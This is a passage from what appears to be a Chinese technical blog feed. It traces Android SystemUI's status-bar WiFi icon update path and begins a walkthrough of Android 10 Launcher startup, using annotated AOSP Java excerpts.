class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">notifyListeners</span><span class="params">(SignalCallback callback)</span> &#123;</span><br><span class="line">    <span class="comment">// only show wifi in the cluster if connected or if wifi-only</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">visibleWhenEnabled</span> <span class="operator">=</span> mContext.getResources().getBoolean(</span><br><span class="line">            R.bool.config_showWifiIndicatorWhenEnabled);</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">wifiVisible</span> <span class="operator">=</span> mCurrentState.enabled &amp;&amp; (</span><br><span class="line">            (mCurrentState.connected &amp;&amp; mCurrentState.inetCondition == <span class="number">1</span>)</span><br><span class="line">                    || !mHasMobileDataFeature || mWifiTracker.isDefaultNetwork</span><br><span class="line">                    || visibleWhenEnabled);</span><br><span class="line">    <span class="type">String</span> <span class="variable">wifiDesc</span> <span class="operator">=</span> mCurrentState.connected ? mCurrentState.ssid : <span class="literal">null</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">ssidPresent</span> <span class="operator">=</span> wifiVisible &amp;&amp; mCurrentState.ssid != <span class="literal">null</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">contentDescription</span> <span class="operator">=</span> getTextIfExists(getContentDescription()).toString();</span><br><span class="line">    <span class="keyword">if</span> (mCurrentState.inetCondition == <span class="number">0</span>) &#123;</span><br><span class="line">        contentDescription += (<span class="string">&quot;,&quot;</span> + mContext.getString(R.string.data_connection_no_internet));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">IconState</span> <span class="variable">statusIcon</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IconState</span>(wifiVisible, getCurrentIconId(), contentDescription);</span><br><span class="line">    <span class="type">IconState</span> <span class="variable">qsIcon</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IconState</span>(mCurrentState.connected,</span><br><span class="line">            mWifiTracker.isCaptivePortal ? R.drawable.ic_qs_wifi_disconnected</span><br><span class="line">                    : getQsCurrentIconId(), contentDescription);</span><br><span class="line">    <span class="comment">// callback为 CallbackHandler对象</span></span><br><span class="line">    callback.setWifiIndicators(mCurrentState.enabled, statusIcon, qsIcon,</span><br><span class="line">            ssidPresent &amp;&amp; mCurrentState.activityIn, ssidPresent &amp;&amp; mCurrentState.activityOut,</span><br><span class="line">            wifiDesc, mCurrentState.isTransient, mCurrentState.statusLabel);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这里回调了StatusBarSignalPolicy#setWifiIndicators() 方法：<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/StatusBarSignalPolicy.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setWifiIndicators</span><span class="params">(<span class="type">boolean</span> enabled, IconState statusIcon, IconState qsIcon,</span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> activityIn, <span class="type">boolean</span> activityOut, String description, <span class="type">boolean</span> isTransient,</span></span><br><span class="line"><span class="params">        String statusLabel)</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">visible</span> <span class="operator">=</span> statusIcon.visible &amp;&amp; !mBlockWifi;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">in</span> <span class="operator">=</span> activityIn &amp;&amp; mActivityEnabled &amp;&amp; visible;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">out</span> <span class="operator">=</span> activityOut &amp;&amp; mActivityEnabled &amp;&amp; visible;</span><br><span class="line">    <span class="type">WifiIconState</span> <span class="variable">newState</span> <span class="operator">=</span> mWifiIconState.copy();</span><br><span class="line">    newState.visible = visible;</span><br><span class="line">    newState.resId = statusIcon.icon;</span><br><span class="line">    newState.activityIn = in;</span><br><span class="line">    newState.activityOut = out;</span><br><span class="line">    newState.slot = mSlotWifi;</span><br><span class="line">    newState.airplaneSpacerVisible = mIsAirplaneMode;</span><br><span class="line">    newState.contentDescription = statusIcon.contentDescription;</span><br><span class="line">    <span class="type">MobileIconState</span> <span class="variable">first</span> <span class="operator">=</span> getFirstMobileState();</span><br><span class="line">    newState.signalSpacerVisible = first != <span class="literal">null</span> &amp;&amp; first.typeId != <span class="number">0</span>;</span><br><span class="line">    updateWifiIconWithState(newState);</span><br><span class="line">    mWifiIconState = newState;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">updateWifiIconWithState</span><span class="params">(WifiIconState state)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (state.visible &amp;&amp; state.resId &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        mIconController.setSignalIcon(mSlotWifi, state);</span><br><span class="line">        mIconController.setIconVisibility(mSlotWifi, <span class="literal">true</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        mIconController.setIconVisibility(mSlotWifi, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过StatusBarIconController接口设置图标的套路都是一样的:</p><ul><li>获取图标名字</li><li>监听事件</li><li>通过StatusBarIconControllerImpl相应的方法设置图标。<br>接下来再看StatusBarIconControllerImpl#setSignalIcon()：</li></ul><p><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/StatusBarIconControllerImpl.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Signal icons need to be handled differently, because they can be</span></span><br><span class="line"><span class="comment"> * composite views</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSignalIcon</span><span class="params">(String slot, WifiIconState state)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> getSlotIndex(slot);</span><br><span class="line">    <span class="keyword">if</span> (state == <span class="literal">null</span>) &#123;</span><br><span class="line">        removeIcon(index, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">StatusBarIconHolder</span> <span class="variable">holder</span> <span class="operator">=</span> getIcon(index, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (holder == <span class="literal">null</span>) &#123;</span><br><span class="line">        holder = StatusBarIconHolder.fromWifiIconState(state);</span><br><span class="line">        setIcon(index, holder);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        holder.setWifiState(state);</span><br><span class="line">        handleSet(index, holder);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先设置WiFi的状态信息，遍历mIconGroups分别执行StatusBarIconController接口中静态类IconManager中的onIconAdded()和onSetIconHolder()的回调。<br>IconManager用于将信息从StatusBarIconController转换为ViewGroup中的ImageViews(com.android.systemui.statusbar.AlphaOptimizedImageView)。<br>接着看IconManager中的onIconAdded()和onSetIconHolder()方法：这两个方法一个用于添加、一个用于更新。<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/StatusBarIconController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">StatusBarIconController</span> &#123;</span><br><span class="line">    ....</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">DarkIconManager</span> <span class="keyword">extends</span> <span class="title class_">IconManager</span> &#123;</span><br><span class="line">        ....</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">DarkIconManager</span><span class="params">(LinearLayout linearLayout)</span> &#123;</span><br><span class="line">            <span class="comment">// 将布局传入IconManager</span></span><br><span class="line">            <span class="built_in">super</span>(linearLayout);</span><br><span class="line">            mIconHPadding = mContext.getResources().getDimensionPixelSize(</span><br><span class="line">                    R.dimen.status_bar_icon_padding);</span><br><span class="line">            mDarkIconDispatcher = Dependency.get(DarkIconDispatcher.class);</span><br><span class="line">        &#125;</span><br><span class="line">        ....</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onIconAdded</span><span class="params">(<span class="type">int</span> index, String slot, <span class="type">boolean</span> blocked,</span></span><br><span class="line"><span class="params">                                   StatusBarIconHolder holder)</span> &#123;</span><br><span class="line">            <span class="comment">// 调用到父类的addHolder方法</span></span><br><span class="line">            <span class="type">StatusIconDisplayable</span> <span class="variable">view</span> <span class="operator">=</span> addHolder(index, slot, blocked, holder);</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">IconManager</span> <span class="keyword">implements</span> <span class="title class_">DemoMode</span> &#123;</span><br><span class="line">        ....</span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">final</span> ViewGroup mGroup;</span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">final</span> Context mContext;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">IconManager</span><span class="params">(ViewGroup group)</span> &#123;</span><br><span class="line">            mGroup = group;</span><br><span class="line">            mContext = group.getContext();</span><br><span class="line">            mIconSize = mContext.getResources().getDimensionPixelSize(</span><br><span class="line">                    R.dimen.status_bar_height);</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line">        ....</span><br><span class="line">        <span class="keyword">protected</span> StatusIconDisplayable <span class="title function_">addHolder</span><span class="params">(<span class="type">int</span> index, String slot, <span class="type">boolean</span> blocked,</span></span><br><span class="line"><span class="params">                                                  StatusBarIconHolder holder)</span> &#123;</span><br><span class="line">            <span class="keyword">switch</span> (holder.getType()) &#123;</span><br><span class="line">                <span class="keyword">case</span> TYPE_ICON:</span><br><span class="line">                    <span class="keyword">return</span> addIcon(index, slot, blocked, holder.getIcon());</span><br><span class="line">                <span class="keyword">case</span> TYPE_WIFI:</span><br><span class="line">                    <span class="keyword">return</span> addSignalIcon(index, slot, holder.getWifiState());</span><br><span class="line">                <span class="keyword">case</span> TYPE_MOBILE:</span><br><span class="line">                    <span class="keyword">return</span> addMobileIcon(index, slot, holder.getMobileState());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@VisibleForTesting</span></span><br><span class="line">        <span class="keyword">protected</span> StatusBarWifiView <span class="title function_">addSignalIcon</span><span class="params">(<span class="type">int</span> index, String slot, WifiIconState state)</span> &#123;</span><br><span class="line">            <span class="comment">// 创建一个StatusBarWifiView </span></span><br><span class="line">            <span class="type">StatusBarWifiView</span> <span class="variable">view</span> <span class="operator">=</span> onCreateStatusBarWifiView(slot);</span><br><span class="line">            view.applyWifiState(state);</span><br><span class="line">            <span class="comment">// 将view 添加进ViewGroup</span></span><br><span class="line">            mGroup.addView(view, index, onCreateLayoutParams());</span><br><span class="line">            <span class="keyword">if</span> (mIsInDemoMode) &#123;</span><br><span class="line">                mDemoStatusIcons.addDemoWifiView(state);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> view;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">private</span> StatusBarWifiView <span class="title function_">onCreateStatusBarWifiView</span><span class="params">(String slot)</span> &#123;</span><br><span class="line">            <span class="type">StatusBarWifiView</span> <span class="variable">view</span> <span class="operator">=</span> StatusBarWifiView.fromContext(mContext, slot);</span><br><span class="line">            <span class="keyword">return</span> view;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        ....</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSetIconHolder</span><span class="params">(<span class="type">int</span> viewIndex, StatusBarIconHolder holder)</span> &#123;</span><br><span class="line">            <span class="keyword">switch</span> (holder.getType()) &#123;</span><br><span class="line">                <span class="keyword">case</span> TYPE_ICON:</span><br><span class="line">                    onSetIcon(viewIndex, holder.getIcon());</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">case</span> TYPE_WIFI:</span><br><span class="line">                    onSetSignalIcon(viewIndex, holder.getWifiState());</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">case</span> TYPE_MOBILE:</span><br><span class="line">                    onSetMobileIcon(viewIndex, holder.getMobileState());</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSetSignalIcon</span><span class="params">(<span class="type">int</span> viewIndex, WifiIconState state)</span> &#123;</span><br><span class="line">            <span class="type">StatusBarWifiView</span> <span class="variable">wifiView</span> <span class="operator">=</span> (StatusBarWifiView) mGroup.getChildAt(viewIndex);</span><br><span class="line">            <span class="keyword">if</span> (wifiView != <span class="literal">null</span>) &#123;</span><br><span class="line">                wifiView.applyWifiState(state);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (mIsInDemoMode) &#123;</span><br><span class="line">                mDemoStatusIcons.updateWifiState(state);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ....</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里根据不同的StatusBarIconHolder类型，设置不同的网络Icon，上面列出了 Wifi 图标相关的方法。<br>SystemUI状态栏图标根据源码可大体分为三种：</p><ol><li>StatusBarIconView</li><li>StatusBarWifiView</li><li>StatusBarMobileView</li></ol><p>这里主要以Wifi 相关图标（StatusBarWifiView）进行分析，添加Icon时首先会创建一个<br>StatusBarWifiView，然后调用StatusBarWifiView的applyWifiState更新其显示状态，最后将其加入到CollapsedStatusBarFragment中放置Icon的ViewGroup中，这样就完成了添加过程；<br>再来看看 CollapsedStatusBarFragment：<br><strong>SystemUI/src/com/android/systemui/statusbar/phone/CollapsedStatusBarFragment.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CollapsedStatusBarFragment</span> <span class="keyword">extends</span> <span class="title class_">Fragment</span> <span class="keyword">implements</span> <span class="title class_">CommandQueue</span>.Callbacks &#123;</span><br><span class="line">    ....</span><br><span class="line">    <span class="keyword">private</span> DarkIconManager mDarkIconManager;</span><br><span class="line">    ....</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> View <span class="title function_">onCreateView</span><span class="params">(LayoutInflater inflater, <span class="meta">@Nullable</span> ViewGroup container,</span></span><br><span class="line"><span class="params">            Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> inflater.inflate(R.layout.status_bar, container, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onViewCreated</span><span class="params">(View view, <span class="meta">@Nullable</span> Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        ....</span><br><span class="line">        <span class="comment">// 这里可以看出status_bar布局中的statusIcons就是我们展示各种Icon的区域</span></span><br><span class="line">        mDarkIconManager = <span class="keyword">new</span> <span class="title class_">DarkIconManager</span>(view.findViewById(R.id.statusIcons));</span><br><span class="line">        mDarkIconManager.setShouldLog(<span class="literal">true</span>);</span><br><span class="line">        Dependency.get(StatusBarIconController.class).addIconGroup(mDarkIconManager);</span><br><span class="line">        ....   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>补充：<br>notifyListenersIfNecessary()在其父类SignalController中定义，<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/policy/SignalController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> CallbackHandler mCallbackHandler;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">notifyListenersIfNecessary</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (isDirty()) &#123;</span><br><span class="line">            saveLastState();</span><br><span class="line">            notifyListeners();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 在这里注意了，在这里的的参数是 CallbackHandler 的对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">notifyListeners</span><span class="params">()</span> &#123;</span><br><span class="line">        notifyListeners(mCallbackHandler);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// callback 则是 CallbackHandler 的对象。</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">notifyListeners</span><span class="params">(SignalCallback callback)</span>;</span><br></pre></td></tr></table></figure><p>CallbackHandler维护了所有需要监听的SignalCallback接口对象,我们的StatusBarSignalPolicy就实现了该接口。<br>StatusBarSignalPolicy主要执行网络图标的刷新动作，其实现了NetworkControllerImpl.SignalCallback接口,然后注册到NetworkController,其具体实现类NetworkControllerImpl会根据WIFI,SIM等状态广播来进一步派发给具体的Controller,例如WifiSignalController,每个Controller只与CallbackHandler交互,然后CallbackHandler继续转交给维护的SignalCallback接口的具体实现类,例如StatusBarSignalPolicy</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> SystemUI </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 10.0 Launcher 启动流程</title>
      <link href="/2023/11/25/2023-11-25/"/>
      <url>/2023/11/25/2023-11-25/</url>
      
        <content type="html"><![CDATA[<p>在前面SystemUI启动流程中说到，在SystemServer中会去启动各种系统服务，这里的launcher也是启动的其中一个服务ActivityManagerService去启动的。在android10之前，系统四大组件的启动都是在ActivityManagerService中，在android10中，单独抽出了一个ActivityTaskManagerService，主要负责Activity的管理和调度。这里先来看下ActivityManagerService服务的启动：<br><strong>frameworks/base/services/java/com/android/server/SystemServer.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">startBootstrapServices</span><span class="params">()</span> &#123;</span><br><span class="line">    ... ...</span><br><span class="line">    <span class="comment">// Activity manager runs the show.</span></span><br><span class="line">    traceBeginAndSlog(<span class="string">&quot;StartActivityManager&quot;</span>);</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> Might need to move after migration to WM.</span></span><br><span class="line">    <span class="type">ActivityTaskManagerService</span> <span class="variable">atm</span> <span class="operator">=</span> mSystemServiceManager.startService(</span><br><span class="line">            ActivityTaskManagerService.Lifecycle.class).getService();</span><br><span class="line">    mActivityManagerService = ActivityManagerService.Lifecycle.startService(</span><br><span class="line">            mSystemServiceManager, atm);</span><br><span class="line">    mActivityManagerService.setSystemServiceManager(mSystemServiceManager);</span><br><span class="line">    mActivityManagerService.setInstaller(installer);</span><br><span class="line">    mWindowManagerGlobalLock = atm.getGlobalLock();</span><br><span class="line">    traceEnd();</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当SystemServiceManager调用 startService() 时，就会通过反射去创建传进去的class，然后在调用创建对象的 onStart() 方法，这里就是去初始化ActivityTaskManagerService和ActivityManagerService对象，并不会去启动launcher，而且系统服务启动分为三块：<br><strong>frameworks/base/services/java/com/android/server/SystemServer.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">startBootstrapServices();   <span class="comment">// 启动引导服务</span></span><br><span class="line">startCoreServices();        <span class="comment">// 启动核心服务</span></span><br><span class="line">startOtherServices();       <span class="comment">// 启动其他服务</span></span><br></pre></td></tr></table></figure><p>在startOtherServices（）中可以看到：<br><strong>frameworks/base/services/java/com/android/server/SystemServer.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">startOtherServices</span><span class="params">()</span> &#123;</span><br><span class="line">    ... ...</span><br><span class="line">    <span class="comment">// We now tell the activity manager it is okay to run third party</span></span><br><span class="line">    <span class="comment">// code.  It will call back into us once it has gotten to the state</span></span><br><span class="line">    <span class="comment">// where third party code can really run (but before it has actually</span></span><br><span class="line">    <span class="comment">// started launching the initial applications), for us to complete our</span></span><br><span class="line">    <span class="comment">// initialization.</span></span><br><span class="line">    mActivityManagerService.systemReady(() -&gt; &#123;</span><br><span class="line">        ... ...</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就说明在所有服务初始化完成后，在这里会通知ActivityManagerService的systemReady()启动 launcher 的进程。<br>下面一起来看 launcher 是如何被启动起来的：<br><strong>frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">systemReady</span><span class="params">(<span class="keyword">final</span> Runnable goingCallback, TimingsTraceLog traceLog)</span> &#123;</span><br><span class="line">    ... ...</span><br><span class="line">    mAtmInternal.startHomeOnAllDisplays(currentUserId, <span class="string">&quot;systemReady&quot;</span>);</span><br><span class="line">    ... ...</span><br><span class="line">    mAtmInternal.resumeTopActivities(<span class="literal">false</span> <span class="comment">/* scheduleIdle */</span>);</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mAtmInternal类型是ActivityTaskManagerInternal，这是一个抽象类，其实现是ActivityTaskManagerService的内部类LocalService：<br><strong>frameworks/base/services/core/java/com/android/server/wm/ActivityTaskManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">LocalService</span> <span class="keyword">extends</span> <span class="title class_">ActivityTaskManagerInternal</span> &#123;</span><br><span class="line">    ... ...</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">startHomeOnAllDisplays</span><span class="params">(<span class="type">int</span> userId, String reason)</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (mGlobalLock) &#123;</span><br><span class="line">            <span class="keyword">return</span> mRootActivityContainer.startHomeOnAllDisplays(userId, reason);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ... ...</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">resumeTopActivities</span><span class="params">(<span class="type">boolean</span> scheduleIdle)</span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (mGlobalLock)&#123;</span><br><span class="line">            mRootActivityContainer.resumeFocusedStacksTopActivities();</span><br><span class="line">            <span class="keyword">if</span>(scheduleIdle)&#123;</span><br><span class="line">                mStackSupervisor.scheduleIdleLocked();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的mRootActivityContainer类型是RootActivityContainer，按照文档上的说明，这是一个临时类，主要是将ActivityStackSupervisor.java中的一部分逻辑分离出来，在android11中，这个类就已经找不到了。替换成了RootWindowContainer，这里我们跟进 mRootActivityContainer.startHomeOnAllDisplays() 方法看，最终会调用到：startHomeOnDisplay() :<br><strong>frameworks/base/services/core/java/com/android/server/wm/RootActivityContainer.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 